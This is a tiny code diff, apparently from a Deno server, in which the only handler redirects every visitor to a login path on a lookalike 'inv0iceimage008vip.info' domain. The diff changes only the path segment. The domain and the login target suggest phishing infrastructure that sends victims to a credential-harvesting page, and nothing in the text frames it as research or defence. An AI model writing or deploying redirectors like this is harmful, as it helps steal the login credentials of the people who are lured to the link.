@@ -5,7 +5,7 @@ serve((_req) => {
   return new Response(null, {
     status: 302,
     headers: {
-      Location: "https://inv0iceimage008vip.info/midflor/login_",
+      Location: "https://inv0iceimage008vip.info/burkhe/login_",
     },
   });
 });
